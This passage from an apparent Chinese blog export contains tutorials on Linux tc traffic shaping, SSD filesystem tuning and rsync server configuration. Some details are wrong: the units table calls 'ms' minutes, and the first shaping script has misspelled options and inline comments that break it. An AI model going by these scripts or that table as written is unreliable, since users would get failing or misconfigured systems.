control)的基础。**无论何时，内核如果需要通过某个网络接口发送数据包，它都需要按照为这个接口配置的qdisc(排队规则)把数据包加入队列。** 然后，内核会尽可能多地从qdisc里面取出数据包，把它们交给网络适配器驱动模块。最简单的QDisc是pfifo它不对进入的数据包做任何的处理，数据包采用先入先出的方式通过队列。不过，它会保存网络接口一时无法处理的数据包。\n\n　　QDISC的类别如下：\n\n#### （1）、CLASSLESS QDisc(不可分类QDisc)\n\n##### 1. 无类别QDISC包括：\n\n　　**[p|b]fifo**\n\n　　使用最简单的qdisc，纯粹的先进先出。只有一个参数：limit，用来设置队列的长度,pfifo是以数据包的个数为单位；bfifo是以字节数为单位。\n\n　　**pfifo_fast**\n\n　　在编译内核时，如果打开了高级路由器(Advanced Router)编译选项，pfifo_fast就是系统的标准QDISC。它的队列包括三个波段(band)。在每个波段里面，使用先进先出规则。而三个波段(band)的优先级也不相同，band 0的优先级最高，band 2的最低。如果band里面有数据包，系统就不会处理band 1里面的数据包，band 1和band 2之间也是一样。数据包是按照服务类型(Type of Service,TOS)被分配多三个波段(band)里面的。\n\n　　**red**\n\n　　red是Random Early Detection(随机早期探测)的简写。如果使用这种QDISC，当带宽的占用接近于规定的带宽时，系统会随机地丢弃一些数据包。它非常适合高带宽应用。\n\n　　**sfq**\n\n　　sfq是Stochastic Fairness Queueing的简写。它按照会话(session--对应于每个TCP连接或者UDP流)为流量进行排序，然后循环发送每个会话的数据包。\n\n　　**tbf**\n\n　　tbf是Token Bucket Filter的简写，适合于把流速降低到某个值。\n\n##### 2. 不可分类QDisc的配置\n\n　　如果没有可分类QDisc，不可分类QDisc只能附属于设备的根。它们的用法如下：\n\n```sh\ntc qdisc add dev DEV root QDISC QDISC-PARAMETERS\n```\n\n　　要删除一个不可分类QDisc，需要使用如下命令：\n\n```sh\ntc qdisc del dev DEV root\n```\n\n　　一个网络接口上如果没有设置QDisc，pfifo_fast就作为缺省的QDisc。\n\n#### （2）、CLASSFUL QDISC(分类QDisc)\n\n##### 可分类的QDisc包括：\n\n　　**CBQ**\n\n　　CBQ是Class Based Queueing(基于类别排队)的缩写。它实现了一个丰富的连接共享类别结构，既有限制(shaping)带宽的能力，也具有带宽优先级管理的能力。带宽限制是通过计算连接的空闲时间完成的。空闲时间的计算标准是数据包离队事件的频率和下层连接(数据链路层)的带宽。\n\n　　**HTB**\n\n　　HTB是Hierarchy Token Bucket的缩写。通过在实践基础上的改进，它实现了一个丰富的连接共享类别体系。使用HTB可以很容易地保证每个类别的带宽，虽然它也允许特定的类可以突破带宽上限，占用别的类的带宽。HTB可以通过TBF(Token Bucket Filter)实现带宽限制，也能够划分类别的优先级。\n\n　　**PRIO**\n\n　　PRIO QDisc不能限制带宽，因为属于不同类别的数据包是顺序离队的。使用PRIO QDisc可以很容易对流量进行优先级管理，只有属于高优先级类别的数据包全部发送完毕，才会发送属于低优先级类别的数据包。为了方便管理，需要使用iptables或者ipchains处理数据包的服务类型(Type Of Service,ToS)。\n\n### CLASS(类)       \n\n　　某些QDisc(排队规则)可以包含一些类别，不同的类别中可以包含更深入的QDisc(排队规则)，通过这些细分的QDisc还可以为进入的队列的数据包排队。通过设置各种类别数据包的离队次序，QDisc可以为设置网络数据流量的优先级。\n\n### FILTER(过滤器)      \n\n　　Filter(过滤器)用于为数据包分类，决定它们按照何种QDisc进入队列。无论何时数据包进入一个划分子类的类别中，都需要进行分类。分类的方法可以有多种，使用fileter(过滤器)就是其中之一。使用filter(过滤器)分类时，内核会调用附属于这个类(class)的所有过滤器，直到返回一个判决。如果没有判决返回，就作进一步的处理，而处理方式和QDISC有关。需要注意的是，filter(过滤器)是在QDisc内部，它们不能作为主体。\n\n## 2.3、操作原理\n\n　　类(Class)组成一个树，每个类都只有一个父类，而一个类可以有多个子类。某些QDisc(例如：CBQ和HTB)允许在运行时动态添加类，而其它的QDisc(例如：PRIO)不允许动态建立类。允许动态添加类的QDisc可以有零个或者多个子类，由它们为数据包排队。此外，每个类都有一个叶子QDisc，默认情况下，这个叶子QDisc使用pfifo的方式排队，我们也可以使用其它类型的QDisc代替这个默认的QDisc。而且，这个叶子叶子QDisc有可以分类，不过每个子类只能有一个叶子QDisc。 当一个数据包进入一个分类QDisc，它会被归入某个子类。\n\n　　我们可以使用以下三种方式为数据包归类，不过不是所有的QDisc都能够使用这三种方式：\n\n* tc过滤器(tc filter)\n\n　　如果过滤器附属于一个类，相关的指令就会对它们进行查询。过滤器能够匹配数据包头所有的域，也可以匹配由ipchains或者iptables做的标记。\n\n* 服务类型(Type of Service)\n\n　　某些QDisc有基于服务类型（Type of Service,ToS）的内置的规则为数据包分类。\n\n* skb->priority\n\n　　用户空间的应用程序可以使用SO_PRIORITY选项在skb->priority域设置一个类的ID。\n\n　　树的每个节点都可以有自己的过滤器，但是高层的过滤器也可以直接用于其子类。\n\n　　如果数据包没有被成功归类，就会被排到这个类的叶子QDisc的队中。相关细节在各个QDisc的手册页中。\n\n## 2.4、命名规则\n\n　　所有的QDisc、类和过滤器都有ID。ID可以手工设置，也可以有内核自动分配。ID由一个主序列号和一个从序列号组成，两个数字用一个冒号分开。\n\n　　**QDISC**\n\n　　一个QDisc会被分配一个主序列号，叫做句柄(handle)，然后把从序列号作为类的命名空间。句柄采用象10:一样的表达方式。习惯上，需要为有子类的QDisc显式地分配一个句柄。\n\n　　**类(CLASS)**\n\n　　在同一个QDisc里面的类分享这个QDisc的主序列号，但是每个类都有自己的从序列号，叫做类识别符(classid)。类识别符只与父QDisc有关，和父类无关。类的命名习惯和QDisc的相同。\n\n　　**过滤器(FILTER)**\n\n　　过滤器的ID有三部分，只有在对过滤器进行散列组织才会用到。详情请参考tc-filters手册页。\n\n## 2.5、单位\n\n　　tc命令的所有参数都可以使用浮点数，可能会涉及到以下计数单位。\n\n|带宽或者流速单位：\n|--------------------------------------------|\n|kbps                           |千字节/秒   |\n|mbps                           |兆字节/秒   |\n|kbit                           |KBits/秒    |\n|mbit                           |MBits/秒    |\n|bps或者一个无单位数字          |字节数/秒   |\n\n\n|数据的数量单位：\n|-------------------------------------|\n|kb或者k                        |千字节    |\n|mb或者m                        |兆字节    |\n|mbit                           |兆bit     |\n|kbit                           |千bit     |\n|b或者一个无单位数字            |字节数    |\n\n\n|时间的计量单位：\n|-------------------------------------------|\n|s、sec或者secs                    |秒    |\n|ms、msec或者msecs                 |分钟   |\n|us、usec、usecs或者一个无单位数字 |微秒  |\n\n\n# 三、TC命令\n\n　　tc可以使用以下命令对QDisc、类和过滤器进行操作：\n\n* add\n\n　　在一个节点里加入一个QDisc、类或者过滤器。添加时，需要传递一个祖先作为参数，传递参数时既可以使用ID也可以直接传递设备的根。如果要建立一个QDisc或者过滤器，可以使用句柄(handle)来命名；如果要建立一个类，可以使用类识别符(classid)来命名。\n\n* remove\n\n　　删除有某个句柄(handle)指定的QDisc，根QDisc(root)也可以删除。被删除QDisc上的所有子类以及附属于各个类的过滤器都会被自动删除。\n\n\n* change\n\n　　以替代的方式修改某些条目。除了句柄(handle)和祖先不能修改以外，change命令的语法和add命令相同。换句话说，change命令不能一定节点的位置。\n\n* replace\n\n　　对一个现有节点进行近于原子操作的删除/添加。如果节点不存在，这个命令就会建立节点。\n\n* link\n\n　　只适用于DQisc，替代一个现有的节点。\n\n\n# 四、具体操作\n\n　　Linux流量控制主要分为建立队列、建立分类和建立过滤器三个方面。\n\n## 4.1、基本实现步骤为：\n\n* （1） 针对网络物理设备（如以太网卡eth0）绑定一个队列QDisc；\n* （2） 在该队列上建立分类class；\n* （3） 为每一分类建立一个基于路由的过滤器filter；\n* （4） 最后与过滤器相配合，建立特定的路由表。\n\n## 4.2、环境模拟实例:\n\n　　流量控制器上的以太网卡(eth0) 的IP地址为192.168.1.66，在其上建立一个CBQ队列。假设包的平均大小为1000字节，包间隔发送单元的大小为8字节，可接收冲突的发送最长包数目为20字节。\n\n　　假如有三种类型的流量需要控制: \n\n1. 是发往主机1的，其IP地址为192.168.1.24。其流量带宽控制在8Mbit，优先级为2；\n2. 是发往主机2的，其IP地址为192.168.1.30。其流量带宽控制在1Mbit，优先级为1；\n3. 是发往子网1的，其子网号为192.168.1.0，子网掩码为255.255.255.0。流量带宽控制在1Mbit，优先级为6。\n\n\n### 1. 建立队列\n\n　　一般情况下，针对一个网卡只需建立一个队列。\n\n　　将一个cbq队列绑定到网络物理设备eth0上，其编号为1:0；网络物理设备eth0的实际带宽为10 Mbit，包的平均大小为1000字节；包间隔发送单元的大小为8字节，最小传输包大小为64字节。\n\n```sh\ntc qdisc add dev eth0 root handle 1: cbq bandwidth 10Mbit avpkt 1000 cell 8 mpu 64\n```\n\n### 2. 建立分类\n\n　　分类建立在队列之上。\n\n　　一般情况下，针对一个队列需建立一个根分类，然后再在其上建立子分类。对于分类，按其分类的编号顺序起作用，编号小的优先；一旦符合某个分类匹配规则，通过该分类发送数据包，则其后的分类不再起作用。\n\n　　**1） 创建根分类1:1；分配带宽为10Mbit，优先级别为8。**\n\n```sh\ntc class add dev eth0 parent 1:0 classid 1:1 cbq bandwidth 10Mbit rate 10Mbit maxburst 20 allot 1514 prio 8 avpkt 1000 cell 8 weight 1Mbit\n```\n\n　　该队列的最大可用带宽为10Mbit，实际分配的带宽为10Mbit，可接收冲突的发送最长包数目为20字节；最大传输单元加MAC头的大小为1514字节，优先级别为8，包的平均大小为1000字节，包间隔发送单元的大小为8字节，相应于实际带宽的加权速率为1Mbit。\n\n　　**2）创建分类1:2，其父分类为1:1，分配带宽为8Mbit，优先级别为2。**\n\n```sh\ntc class add dev eth0 parent 1:1 classid 1:2 cbq bandwidth 10Mbit rate 8Mbit maxburst 20 allot 1514 prio 2 avpkt 1000 cell 8 weight 800Kbit split 1:0 bounded\n```\n\n　　该队列的最大可用带宽为10Mbit，实际分配的带宽为 8Mbit，可接收冲突的发送最长包数目为20字节；最大传输单元加MAC头的大小为1514字节，优先级别为1，包的平均大小为1000字节，包间隔发送单元的大小为8字节，相应于实际带宽的加权速率为800Kbit，分类的分离点为1:0，且不可借用未使用带宽。\n\n　　**3）创建分类1:3，其父分类为1:1，分配带宽为1Mbit，优先级别为1。**\n\n```sh\ntc class add dev eth0 parent 1:1 classid 1:3 cbq bandwidth 10Mbit rate 1Mbit maxburst 20 allot 1514 prio 1 avpkt 1000 cell 8 weight 100Kbit split 1:0\n```\n\n　　该队列的最大可用带宽为10Mbit，实际分配的带宽为 1Mbit，可接收冲突的发送最长包数目为20字节；最大传输单元加MAC头的大小为1514字节，优先级别为2，包的平均大小为1000字节，包间隔发送单元的大小为8字节，相应于实际带宽的加权速率为100Kbit，分类的分离点为1:0。\n\n　　**4）创建分类1:4，其父分类为1:1，分配带宽为1Mbit，优先级别为6。**\n\n```sh\ntc class add dev eth0 parent 1:1 classid 1:4 cbq bandwidth 10Mbit rate 1Mbit maxburst 20 allot 1514 prio 6 avpkt 1000 cell 8 weight 100Kbit split 1:0\n```\n\n　　该队列的最大可用带宽为10Mbit，实际分配的带宽为1Mbit，可接收冲突的发送最长包数目为20字节；最大传输单元加MAC头的大小为1514字节，优先级别为6，包的平均大小为1000字节，包间隔发送单元的大小为8字节，相应于实际带宽的加权速率为100Kbit，分类的分离点为1:0。\n\n## 4.3. 建立过滤器 \n\n　　过滤器主要服务于分类。\n\n一般只需针对根分类提供一个过滤器，然后为每个子分类提供路由映射。\n\n**1） 应用路由分类器到cbq队列的根，父分类编号为1:0；过滤协议为ip，优先级别为100，过滤器为基于路由表。**\n\n```sh\ntc filter add dev eth0 parent 1:0 protocol ip prio 100 route\n```\n\n**2） 建立路由映射分类1:2, 1:3, 1:4**\n\n```sh\ntc filter add dev eth0 parent 1:0 protocol ip prio 100 route to 2 flowid 1:2\n\ntc filter add dev eth0 parent 1:0 protocol ip prio 100 route to 3 flowid 1:3\n\ntc filter add dev eth0 parent 1:0 protocol ip prio 100 route to 4 flowid 1:4\n```\n\n## 4.4.建立路由\n\n　　该路由是与前面所建立的路由映射一一对应。\n\n　　**1） 发往主机192.168.1.24的数据包通过分类2转发(分类2的速率8Mbit)**\n\n```sh\nip route add 192.168.1.24 dev eth0 via 192.168.1.66 realm 2\n```\n　　**2） 发往主机192.168.1.30的数据包通过分类3转发(分类3的速率1Mbit)**\n\n```sh\nip route add 192.168.1.30 dev eth0 via 192.168.1.66 realm 3\n```\n　　**3）发往子网192.168.1.0/24的数据包通过分类4转发(分类4的速率1Mbit)**\n\n```sh\nip route add 192.168.1.0/24 dev eth0 via 192.168.1.66 realm 4\n```\n\n　　**注**：一般对于流量控制器所直接连接的网段建议使用IP主机地址流量控制限制，不要使用子网流量控制限制。如一定需要对直连子网使用子网流量控制限制，则在建立该子网的路由映射前，需将原先由系统建立的路由删除，才可完成相应步骤。\n\n## 4.5. 监视\n\n　　主要包括对现有队列、分类、过滤器和路由的状况进行监视。\n\n　　**1）显示队列的状况**\n\n　　简单显示指定设备(这里为eth0)的队列状况\n\n```\ntc qdisc ls dev eth0\n\nqdisc cbq 1: rate 10Mbit (bounded,isolated) prio no-transmit\n```\n　　详细显示指定设备(这里为eth0)的队列状况\n\n```\ntc -s qdisc ls dev eth0\n```\n\n　　这里主要显示了通过该队列发送了13232个数据包，数据流量为7646731个字节，丢弃的包数目为0，超过速率限制的包数目为0。\n\n　　**2）显示分类的状况**\n\n　　简单显示指定设备(这里为eth0)的分类状况\n\n```\ntc class ls dev eth0\n```\n\n　　详细显示指定设备(这里为eth0)的分类状况\n\n```\ntc -s class ls dev eth0\n```\n\n　　这里主要显示了通过不同分类发送的数据包，数据流量，丢弃的包数目，超过速率限制的包数目等等。其中根分类(class cbq 1:0)的状况应与队列的状况类似。\n\n　　例如，分类class cbq 1:4发送了8076个数据包，数据流量为5552879个字节，丢弃的包数目为0，超过速率限制的包数目为0。\n\n　　**3）显示过滤器的状况**\n\n```\ntc -s filter ls dev eth0\n```\n　　这里flowid 1:2代表分类class cbq 1:2，to 2代表通过路由2发送。\n\n　　**4）显示现有路由的状况**\n\n```\nip route\n```\n\n　　如上所示，结尾包含有realm的显示行是起作用的路由过滤器。\n\n\n# 五、实例脚本\n\n## 5.1 tc限速\n\n```sh\n#! /bin/sh\n\ntouch  /var/lock/subsys/local\n\necho  1  > /proc/sys/net/ipv4/ip_forward （激活转发）\n\nroute add default  gw  10.0.0.0  (这是加入电信网关，如果你已设了不用这条）\n\nDOWNLOAD=640Kbit        (640/8 =80K ,我这里限制下载最高速度只能80K）\nUPLOAD=640Kbit          (640/8 =80K,上传速度也限制在80K）\nINET=192.168.0.         (设置网段，根据你的情况填）\nIPS=1                   (这个意思是从192.168.0.1开始）\nIPE=200                 (我这设置是从IP为192.168.0.1-200这个网段限速，根据自已的需要改）\nServerIP=253            (网关IP）\nIDEV=eth0\nODEV=eth1\n\n/sbin/tc  qdisc  del  dev  $IDEV root handle 10:\n/sbin/tc  qdisc  del  dev  $ODEV  root handle  20:\n/sbin/tc  qdisc  add  dev $IDEV  root  handle  10: cbq  bandwidth  100Mbit avpkt  1000\n/sbin/tc  qdisc  add  dev  $ODEV  root  handle  20: cbq bandwidth  1Mbit  avpkt  1000\n/sbin/tc  class  add  dev $IDEV  parent 10:0  classid  10:1  cbq  bandwidth  100Mbit  rate 100Mbit  allot 1514  weight  1Mbit  prio  8  maxburst  20  avpkt  1000\n/sbin/tc  class  add  dev  $ODEV  parent  20:0  classid  20:1 cbq  bandwidth  1Mbit  rate  1Mbit  allot  1514  weitht  10Kbit  prio  8  maxburst  20  avpkt  1000\n\nCOUNTER=$IPS\nwhile  [  $COUNTER  -le  $IPE  ]\n    do\n/sbin/tc  class  add  dev  $IDEV  parent  10:1  classid  10:1$COUNTER  cbq  banwidth  100Mbit  rate  \n$DOWNLOAD  allot  1514  weight  20Kbit  prio  5  maxburst  20  avpkt  1000  bounded\n/sbin/tc  qdisc  add  dev  $IDEV  parent  10:1$COUNTER  sfq  quantum  1514b  perturb15\n\n/sbin/tc  filter  add  dev  $IDEV  parent  10:0  protocol  ip  prio  100  u32  match  ipdst  $INET$COUNTER  flowid  10:1$COUNTER\n      COUNTER=` expr  $COUNTER  +  1  `\ndone\n\niptables  -t  nat  -A  POSTROUTING  -o  eth1  -s  192.168.0.0/24  -J  MASQUERADE\n```\n\n## 5.2 模型\n\n```sh   \n#!/bin/sh\ntc qdisc del dev eth7 root &> /dev/null\ntc qdisc del dev eth8 root &> /dev/null\n\n#Add qdisc\ntc qdisc add dev eth7 root handle 10: htb default 9998\ntc qdisc add dev eth8 root handle 10: htb default 9998\n\n#Add htb root node\ntc class add dev eth7 parent 10: classid 10:9999 htb rate 1000000kbit ceil 1000000kbit\ntc class add dev eth8 parent 10: classid 10:9999 htb rate 1000000kbit ceil 1000000kbit\n\n#Add htb fake default node here\ntc class add dev eth7 parent 10:9999 classid 10:9998 htb rate 1000000kbit ceil 1000000kbit\ntc class add dev eth8 parent 10:9999 classid 10:9998 htb rate 1000000kbit ceil 1000000kbit\n\n#Add rule node\ntc class add dev eth7 parent 10:9999 classid 10:3 htb rate 1kbit ceil 50kbit\ntc filter add dev eth7 parent 10: protocol ip handle 3 fw classid 10:3\ntc class add dev eth8 parent 10:9999 classid 10:3 htb rate 1kbit ceil 50kbit\ntc filter add dev eth8 parent 10: protocol ip handle 3 fw classid 10:3\n\n#Add htb real default node here\ntc class change dev eth7 classid 10:9998 htb rate 1kbit ceil 1000000kbit\ntc class change dev eth8 classid 10:9998 htb rate 1kbit ceil 1000000kbit\n```\n\n## 5.3 限制一个IP上传下载速度\n\n```sh\n#!/bin/bash\n#\n#  tc uses the following units when passed as a parameter.\n#  kbps: Kilobytes per second\n#  mbps: Megabytes per second\n#  kbit: Kilobits per second\n#  mbit: Megabits per second\n#  bps: Bytes per second\n#       Amounts of data can be specified in:\n#       kb or k: Kilobytes\n#       mb or m: Megabytes\n#       mbit: Megabits\n#       kbit: Kilobits\n#  To get the byte figure from bits, divide the number by 8 bit\n#\n\n#\n# Name of the traffic control command.\nTC=/sbin/tc\n\n# The network interface we're planning on limiting bandwidth.\nIF=em1             # Interface\n\n# Download limit (in mega bits)\nDNLD=80mbit          # DOWNLOAD Limit\n\n# Upload limit (in mega bits)\nUPLD=80mbit          # UPLOAD Limit\n\n# IP address of the machine we are controlling\nIP=125.64.15.21     # Host IP\n\n# Filter options for limiting the intended interface.\nU32=\"$TC filter add dev $IF protocol ip parent 1:0 prio 1 u32\"\n\nstart() {\n\n# We'll use Hierarchical Token Bucket (HTB) to shape bandwidth.\n# For detailed configuration options, please consult Linux man\n# page.\n\n    $TC qdisc add dev $IF root handle 1: htb default 30\n    $TC class add dev $IF parent 1: classid 1:1 htb rate $DNLD\n    $TC class add dev $IF parent 1: classid 1:2 htb rate $UPLD\n    $U32 match ip dst $IP/32 flowid 1:1\n    $U32 match ip src $IP/32 flowid 1:2\n\n# The first line creates the root qdisc, and the next two lines\n# create two child qdisc that are to be used to shape download\n# and upload bandwidth.\n#\n# The 4th and 5th line creates the filter to match the interface.\n# The 'dst' IP address is used to limit download speed, and the\n# 'src' IP address is used to limit upload speed.\n\n}\n\nstop() {\n\n# Stop the bandwidth shaping.\n    $TC qdisc del dev $IF root\n\n}\n\nrestart() {\n\n# Self-explanatory.\n    stop\n    sleep 1\n    start\n\n}\n\nshow() {\n\n# Display status of traffic control status.\n    $TC -s qdisc ls dev $IF\n\n}\n\ncase \"$1\" in\n\n  start)\n\n    echo -n \"Starting bandwidth shaping: \"\n    start\n    echo \"done\"\n    ;;\n\n  stop)\n\n    echo -n \"Stopping bandwidth shaping: \"\n    stop\n    echo \"done\"\n    ;;\n\n  restart)\n\n    echo -n \"Restarting bandwidth shaping: \"\n    restart\n    echo \"done\"\n    ;;\n\n  show)\n\n    echo \"Bandwidth shaping status for $IF:\"\n    show\n    echo \"\"\n    ;;\n\n  *)\n\n    pwd=$(pwd)\n    echo \"Usage: tc.bash {start|stop|restart|show}\"\n    ;;\n\nesac\n\nexit 0\n```\n\n本文原文出处:http://leslie-chu.blog.163.com/blog/static/19986324320125414618221\n\n主要参考（所有权利归原文作者所有）：\n\nhttp://www.cnblogs.com/endsock/archive/2011/12/09/2281519.html\n\nhttp://blog.163.com/ninja_wk/blog/static/989155620084280154811/\n\nhttp://www.chinaunix.net/jh/4/16110.html\n","tags":["tc"],"categories":["service"]},{"title":"Linux上ssd优化","url":"/2017/05/27/system/Linux上ssd优化/","content":"# 一、修改默认的固态硬盘(SSD)柱面大小\n\n　　提升Linux下固态硬盘的使用率，在安装Linux操作系统前就应该做相关工作。系统会先在磁盘上创建分区，通常创建的分区包含固定数量的柱面，而默认情况下，每个柱面由16065512个字节的扇区组成。\n  \n<!-- more -->\n\n　　现在的问题是，当默认柱面空间大小被完全使用后，固态硬盘就不能发挥最佳性能。因为要固态硬盘读这个操作需要使用4KB的字节块，而固态硬盘控制器删除操 作则需要512KB的字节块。问题是，有了通常用于Linux上的默认分区，分区的开始没必要也是一个4KB新分区的开始。结果，一次读取或写入操作也许 需要SSD设备上的两个不同的区块，这也减缓了SSD磁盘的性能。\n\n　　为了避免这种问题，可以采用fdisk方式来创建分区，配置三个选项来指定使用柱面及拍面大小。具体的命令如下：\n\n```sh\nfdisk -H 32 -C 32 –c /dev/sdb\n```\n# 二、配置固态硬盘(SSD)的文件系统\n\n### 1.创建文件系统\n\n　　接着需要关注的就是文件系统。想要优化文件系统删除字节区块的效率，就必须确保小于512K的文件分布在不同的删除字节区块上。要做到这一点，必须确保在创建可扩展文件系统时指定了需要使用的条带的宽度和幅度。这些值在页面中指定，默认大小为4KB。要创建一个最佳的可扩展文件系统，应该使用如下命令：\n\n```sh\nmkfs.ext4 -E stride=128,stripe-width=128 /dev/sda1\n```\n\n　　如果要修改现有的文件系统的参数，可以使用tune2fs实用程序：\n\n```sh\ntune2fs -E stride=128,stripe-width=128 /dev/sda1\n```\n\t\n### 2.文件系统日志\n\n　　关闭日志功能，可以延长SSD寿命，但是突然断电容易造成文件损坏\n\n```sh\ntune2fs -O ^has_journal /dev/sda2  关闭日志；\n```\n\n　　然后执行\n\n```sh\ne2fsck -f /dev/sda2；\n```\n\n　　检查日志是否关闭成功：\n\n```sh\ndmesg | grep EXT4\n```\n\n　　如果显示 “EXT4-fs (sda2): mounted filesystem without journal”  说明关闭日志成功；否则显示 “mounted filesystem with ordered data mode”\n\n\n　　要打开日志\n\n```sh\ntune2fs -O has_journal /dev/sda2   \n```\n\n### 3.设置noatime\n\n　　不记录文件访问时间，该选项保证了文件的访问时间不会因为每次读取而更新，从而降低对文件系统的写入次数。\n\n　　在fstb 中加入noatime　选项\n\n```sh\n/dev/sda1 / ext4 discard,defaults  改为  /dev/sda1 / ext4 noatime,defaults\n```\n\n# 三、配置固态硬盘(SSD)的I/O调度程序\n\n　　优化的第三个部分涉及到I/O调度程序。该模块是一个决定如何处理I/O请求的核心组件。默认情况下就是非常公平的排队，对于普通的磁盘驱动器来说，这是很好的方案，但对于以期限调度为优势的固态硬盘来说，这并不是最好的。\n\n　　如果你想在系统中对所有磁盘采用期限调度，可以在内核加载时把`elevator=deadline`这句话加入到系统引导管理器(GURB)中;如果你只是想针对某一个磁盘，就应该在rc.local文件中加入类似如下实例的一句话，那么每次当系统重启，期限调度就会应用到指定的磁盘。如下实例将会对 /dev/sdb磁盘采用期限调度。\n\n```sh\necho deadline > /sys/block/xvda/queue/scheduler\n```\n　　给IO的算法修改成 noop,操作系统本身不做处理,让 ssd 本身处理.\n\n```sh\necho noop >  /sys/block/sda/queue/scheduler\n```\n\n# 四、清理固态硬盘(SSD)中的数据块\n\n　　最后一个重要的步骤称为“清理”，该操作可以确保在删除文件后相应的数据块真正清空，然后在创建新的文件时才能有可用的数据块。如果没有清理操作，一旦数 据块空间填满，固态硬盘的性能就会下降。如果使用丢弃挂载选项，当文件删除后，数据块也会被相应地清除，这样可以显著提高固态硬盘的性能。2.6.33以 上的内核已经支持清理操作。\n\n　　Linux内核从2.6.33开始提供TRIM支持，所以先运行“uname -a”命令，查看自己的内核版本，如果内核版本低于2.6.33的，请先升级内核。然后运行“hdparm -I /dev/sda”查看自己的硬盘支不支持TRIM技术，如果支持，你会看到\n\n```\n* Data Set Management TRIM supported\n```\n\n　　注意：如果SSD组RAID0后，将失去Trim功能\n\n　　如果上面两个条件都满足了，就可以在fstab中添加discard来开启TRIM功能，如：\n\n```sh\n原始的UUID=2f6be0cf-2f54-4646-b8c6-5fb0aa01ef23 / ext4 defaults,errors=remount-ro 0 1\n改后的UUID=2f6be0cf-2f54-4646-b8c6-5fb0aa01ef23 / ext4 discard,defaults,errors=remount-ro,noatime 0 1\n```\n\n　　在fasab配置文件中完成对文件系统的这些修改后，重启计算机，或者通知文件系统重新读取其配置，然后使用/etc/fstab文件中包含的mount -o remount命令重新安装每个文件系统。\n\n","tags":["调优"],"categories":["system"]},{"title":"rsync安装配置实例","url":"/2017/05/26/service/rsync安装配置实例/","content":"\n本文详细介绍了rsync安装配置实例。\n<!-- more -->\n\n# 一. 安装rsync\n\n```sh\nyum install rsync\n```\n\n# 二. 配置rsync服务器端\n\n### 1、  修改rsync的配置文件\n\n```sh\ncat /etc/xinetd.d/rsync\n\n# default: off\n# description: The rsync server is a good addition to an ftp server, as it \\\n#   allows crc checksumming etc.\nservice rsync\n{\n    disable = yes\n    flags           = IPv6\n    socket_type     = stream\n    wait            = no\n    user            = root\n    server          = /usr/bin/rsync\n    server_args     = --daemon\n    log_on_failure  += USERID\n}\n\n```\n\n　　可以看到rysnc服务是关闭的(disable = yes)，这里把它开启，把disable的值改为no\n\n### 2、  创建rsync服务器配置文件/etc/rsyncd.conf\n\n```sh\nvim /etc/rsyncd.conf\n\nuid = root\ngid = root\nport = 873                                      #　指定运行端口，默认是873，您可以自己指定\nhosts allow = 192.168.0.204, 192.168.1.205      # 允许访问的客户机\n#hosts deny = 0.0.0.0/32                        #　拒绝访问的\nuse chroot = \nmax connections = \ntimeout=\n\n# 下面这些文件是安装完RSYNC服务后自动生成的文件,当然也可以手动配置到指定路径\n\npid file = /var/run/rsyncd.pid      #pid文件的存放\nlock file = /var/run/rsync.lock     #锁文件的存放位置\nlog file = /var/log/rsyncd.log      #日志记录文件的存放\nmotd file = /etc/rsyncd.motd        #欢迎\n\n# 上面这段是全局配置，下面的模块可以有\n\n[test]                                        # 模块名字，自己命名\npath = /home/hyj/workspace/test               # 指定文件目录所在位置，这是必须指定 \ncomment = rsync files                         # 注释\nignore errors                                 # 忽略IO\nread only = yes \nlist = no                                     # 是否把rsync 服务器上提供同步数据的目录显示\nauth users = rsync                            # 同步验证时用的账号，如果没有这项就是匿名同步，client同步时不用用户名也能同步。\nsecrets file = /etc/rsync.passwd              # 指定认证文件\n```\n\n### 3、  创建认证文件：\n\n#### 3.1. 创建认证文件\n```sh\nvim /etc/rsync.passwd\n\nrsync:hyl            # 用户名：密码。注意这个不是系统用户，只是rsync用户。所以不用useradd。\n```\n\n　　名字随便写，只要和上边配置文件里的“auth users”参数一致即可，格式(一行一个用户)账号：密码\n\n\n#### 3.2. 修改认证文件权限\n\n　　把认证文件的权限改成600\n\n```sh\nchmod 600 /etc/rsync.passwd          ## 只能所有者可读，否则报错\n```\n\n### 4、 欢迎信息\n\n　　如果在配置文件中指定了欢迎信息，在/etc下创建rsyncd.motd，设置欢迎信息：\n\n```sh\nvim /etc/rsyncd.motd\n\n      Welcome the rsync services!\n```\n\n# 三. 启动rsync\n\n### 1、 在server端将rsync启动：\n\n#### 1.1 启动rsync服务端（以守护进程形式，独立启动）\n\n```sh\n/usr/bin/rsync --daemon\n```\n\n#### 1.2 启动rsync服务端 （以xinetd超级进程启动）\n\n```sh\n/etc/rc.d/init.d/xinetd reload(reload是网上的说法，但是我试了一下报错，start可以)\n```\n\n### 2、 防火墙设置：\n\n　　如果服务器上装有防火墙，需在服务器中设置iptables将837端口开放。\n\n```sh\niptables -A INPUT -p tcp --dport 873 -j ACCEPT\n```\n\n# 四. 配置rsync客户端\n\n### 1、用安装服务器端的方式安装rsync。\n\n　　启动rsync，如果报如下错误，是因为在etc下没有rsyncd.conf配置文件：\n\n```sh\nrsync --daemon\nFailed to parse config file: /etc/rsyncd.conf\n```\n\n　　创建配置文件 `/etc/rsyncd.conf` 文件内容为空就行。然后启动rsync，可以启动\n\n### 2、Rsync的命令格式可以为以下六种：\n\n```sh\n　　rsync [OPTION]... SRC DEST\n　　rsync [OPTION]... SRC [USER@]HOST:DEST\n　　rsync [OPTION]... [USER@]HOST:SRC DEST\n　　rsync [OPTION]... [USER@]HOST::SRC DEST\n　　rsync [OPTION]... SRC [USER@]HOST::DEST\n　　rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]\n```\n\n　　常用为以下两种：\n\n#### 第一种：\n\n```sh\nrsync [OPTION]... [USER@]HOST::SRC   DEST\n```\n\n　　从远程rsync服务器中拷贝文件到本地机。当SRC路径信息包含\"::\"分隔符时启动该模式。\n\n```sh\n如：rsync -av root@172.16.78.192::www /databack\n```\n\n#### 第二种：\n\n```sh\nrsync [OPTION]... SRC   [USER@]HOST::DEST\n```\n\n　　从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含\"::\"分隔符时启动该模式。\n\n```sh\n如：rsync -av /databack root@172.16.78.192::www\n```\n\n### 3、下面为实例：\n\n　　服务器ip为192.168.8.126，客户端ip为192.168.8.122\n\n　　(1)、把服务器上的/home/hyj/workspace/test文件夹中的内容备份到客户端的/usr/local/share/rsync_backup中:\n\n```sh\n/usr/bin/rsync -vzrtopg --delete  --progress rsync@192.168.8.126::test /usr/local/share/rsync_backup\n```\n\n　　`/etc/rsyncd.conf` 中模块的内容：\n\n```sh\n[test]\npath = /home/hyj/workspace/test\ncomment = rsync files\nignore errors\nread only = yes\nlist = 